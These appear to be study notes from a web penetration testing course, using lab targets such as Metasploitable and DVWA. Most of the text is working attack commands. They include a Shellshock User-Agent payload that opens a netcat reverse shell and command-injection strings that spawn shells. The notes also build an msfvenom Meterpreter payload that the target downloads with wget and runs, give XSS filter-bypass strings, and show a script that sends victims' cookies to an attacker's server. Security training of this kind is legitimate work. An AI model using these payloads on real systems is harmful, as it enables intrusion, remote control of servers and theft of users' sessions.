# Website Penetration

## HTTP Request and Response

HTTP Requests are sent to the server that contains the web page we want. It responds with a HTTP Response letting us know if it does or does not have the resource we requested, along with Headers and corresponding HTML code.

## Information Gathering and Dirb Tool

Use the same gathering tools as before along with Dirb

`dirb http://METASPLOITABLEIP` - returns list of subdirectories

## Burbsuite

A proxy that allows us to customize HTTP requests

03 Website Application Analysis -> burpsuite

Rewatch video for configuration.

## Shellshock Exploitation

Discovered in 2014. This exploit can be tested by downloading a VM from pentesterlab

Right click the cgi request to the vulnerable machine, and send to repeater

Replace the User Agent field - `() { :;}; /bin/bash -c 'nc OURIP OURPORT -e /bin/bash'`
Before sending with burpsuite, set up a listener `nc -lvp OURPORT`

This works because of a vulnerability that used to exist with how bash handled environment variables and empty functions.

`exploit/multi/http/apachee_mod_cgi_bash_env_exec` - Use msf exploit module to accomplish the same thing. Need to set RHOSTS and TARGETURI

## Command Injection

Similar to the Shellshock exploit, but this command injection takes place on the website itself.

This exploit can be tested in Metasploitable

`192.168.1.1; ls -al`

(&& / & / | also work as a command separator)

We can use netcat to exploit this

`nc -lvp IP`

`192.168.1.1; nc -e /bin/bash OURIP PORT`

Set DVWA to medium vulnerability

`192.168.1.1 & ls -al` ends up working

## Meterpreter Shell with Command Injection

Meterpreter gives us a lot more options than netcat.

So we need to create an appropriate payload, download the payload to the target machine, and execute the payload on the target machine (both of these through command injection)

Linux comes with Python installed, so we'll use a python payload.

`msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.9 LPORT=6000 >> tester.py`

The target machine has to download our payload from somewhere, so we'll set up an Apache server. Apache comes with Linux.

`sudo service apache2 start`

in root -

`cp /home/kali/Desktop/tester.py /var/www/html/`

in DVWA - 

`; wget 192.168.1.9/tester.py` - target machine downloads our payload

set up listener -

`use exploit/multi/handler` - Set payload (python/meterpreter/reverse_tcp), set LHOST and LPORT (6000)

in DVWA - 
`; python tester.py`

## Reflected XSS and Cookie Stealing

These attacks target other website users. Stored XSS attacks get saved by the server and runs on the future user's machine. Reflected XSS doesn't get saved by the server, but will work if you send a malicious link to someone. These are often used for session stealing, to mine on other machines, or to create botnets.

We will use DVWA to test.

Enter the script into the form input, then copy the URL.

`<script>alert('1')</script>`
`<SCRIPT>alert('1')</SCRIPT>`
`<scr<script>ipt>alert('1')</script>`

Start python HTTP server to save cookies from this script

`python -m SimpleHTTPServer 8000`

```
<SCRIPT>
    document.write('<img src="http://192.168.1.9:8000/' + document.cookie + ' ">');
</SCRIPT>
```